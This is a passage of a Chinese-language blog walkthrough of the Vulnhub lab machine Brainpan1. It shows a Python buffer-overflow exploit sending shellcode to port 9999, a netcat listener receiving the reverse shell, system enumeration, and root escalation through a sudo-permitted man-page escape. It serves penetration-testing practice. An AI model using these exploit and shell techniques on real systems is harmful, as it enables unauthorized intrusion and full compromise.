class=\"hljs-string\">b\"\\x03\\xc6\\x7d\\xf0\\x80\\x51\\x60\\x44\\x2d\\xaf\\xe3\"</span>\na = <span class=\"hljs-string\">b'A'</span>*<span class=\"hljs-number\">524</span>+<span class=\"hljs-string\">b'\\xf3\\x12\\x17\\x31'</span>+<span class=\"hljs-string\">b'\\x90'</span>*<span class=\"hljs-number\">16</span>+buf\ns = socket.socket()\ns.connect((<span class=\"hljs-string\">'192.168.75.166'</span>,<span class=\"hljs-number\">9999</span>))\nr = s.recv(<span class=\"hljs-number\">1024</span>)\ns.send(a)\ns.close()\n</code></pre>\n<pre><code class=\"hljs language-python\">nc -lvp <span class=\"hljs-number\">1234</span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.166</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.166</span>] <span class=\"hljs-number\">50714</span>\nls\nchecksrv.sh\nweb\n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>尝试获得交互性更好的</p>\n<pre><code class=\"hljs language-python\">python -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/sh')\"</span>  \n$ \n</code></pre>\n</li>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1002</span>(puck) gid=<span class=\"hljs-number\">1002</span>(puck) groups=<span class=\"hljs-number\">1002</span>(puck)\n//\n$ uname -a\nLinux brainpan <span class=\"hljs-number\">3.5</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">25</span>-generic <span class=\"hljs-comment\">#39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux</span>\n//\n$ ip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">16436</span> qdisc noqueue state UNKNOWN \n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UNKNOWN qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:e7:<span class=\"hljs-number\">37</span>:be brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.166</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> eth0\n    inet6 fe80::20c:29ff:fee7:37be/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n$ \n//\n$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null\nfind / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null\n/<span class=\"hljs-built_in\">bin</span>/umount\n/<span class=\"hljs-built_in\">bin</span>/su\n/<span class=\"hljs-built_in\">bin</span>/mount\n/<span class=\"hljs-built_in\">bin</span>/fusermount\n/<span class=\"hljs-built_in\">bin</span>/ping6\n/<span class=\"hljs-built_in\">bin</span>/ping\n/usr/<span class=\"hljs-built_in\">bin</span>/sudo\n/usr/<span class=\"hljs-built_in\">bin</span>/mtr\n/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/usr/<span class=\"hljs-built_in\">bin</span>/sudoedit\n/usr/<span class=\"hljs-built_in\">bin</span>/chfn\n/usr/<span class=\"hljs-built_in\">bin</span>/traceroute6.iputils\n/usr/<span class=\"hljs-built_in\">bin</span>/at\n/usr/<span class=\"hljs-built_in\">bin</span>/lppasswd\n/usr/<span class=\"hljs-built_in\">bin</span>/passwd\n/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/usr/sbin/uuidd\n/usr/sbin/pppd\n/usr/local/<span class=\"hljs-built_in\">bin</span>/validate\n/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/pt_chown\n//\nsudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> puck on this host:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser puck may run the following commands on this host:\n    (root) NOPASSWD: /home/anansi/<span class=\"hljs-built_in\">bin</span>/anansi_util\n\n</code></pre>\n<p>发现anansi拥有sudo权限</p>\n</li>\n<li>\n<p>尝试提权</p>\n<pre><code class=\"hljs language-python\">sudo /home/anansi/<span class=\"hljs-built_in\">bin</span>/anansi_util\n//\nUsage: /home/anansi/<span class=\"hljs-built_in\">bin</span>/anansi_util [action]\nWhere [action] <span class=\"hljs-keyword\">is</span> one of:\n  - network\n  - proclist\n  - manual [command]\n</code></pre>\n<p>看到 <code>- manual [command]</code>可以跟命令</p>\n<pre><code class=\"hljs language-python\">$ sudo /home/anansi/<span class=\"hljs-built_in\">bin</span>/anansi_util manual ls      \nsudo /home/anansi/<span class=\"hljs-built_in\">bin</span>/anansi_util manual ls\nNo manual entry <span class=\"hljs-keyword\">for</span> manual\nWARNING: terminal <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> fully functional\n-  (press RETURN)!/<span class=\"hljs-built_in\">bin</span>/bash\n</code></pre>\n<p>这里有交互，因为输入了ls，所以应该使用root权限下执行的，我们尝试输入<code>!/bin/sh</code></p>\n<pre><code class=\"hljs language-python\">\n!/<span class=\"hljs-built_in\">bin</span>/bash\nroot@brainpan:/usr/share/man<span class=\"hljs-comment\">#</span>\n</code></pre>\n<p>提权成功</p>\n</li>\n</ol>\n<h2>总结</h2>\n<p>缓冲区溢出漏洞，ret2shellcode类型，补习坏字节检测以及nop</p>","title":"Vulnhub - Brainpan1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Brainpan1 主机发现端口扫描 1. 使用nmap扫描网段类存活主机 因为靶机是我最后添加的，所以靶机IP是166 2. 扫描主机开放端口 3. 扫描主机服务版本以及系统版本 扫出了很奇怪的东西 4. 扫描漏洞 什么都没有 9999端口 1. 在浏览器访问出现了 2. 使用nc连接尝试 尝试输..."},"recentPosts":[{"id":"TheHackersLabsLuna","title":"TheHackersLabs - Luna","date":"2025-10-28","isEncrypted":false,"year":"2025","month":"10","day":"28"},{"id":"TheHackersLabsTHLPWN","title":"TheHackersLabs - THLPWN","date":"2025-10-27","isEncrypted":false,"year":"2025","month":"10","day":"27"},{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackTheBoxSeason9 - Conversor","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","isEncrypted":true,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Machine - Artificial","date":"2025-06-28","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"HackTheBoxSeason8 - Puppy","title":"HackTheBox - Machine - Puppy","date":"2025-05-19","isEncrypted":false,"year":"2025","month":"10","day":"25"}]},"__N_SSG":true}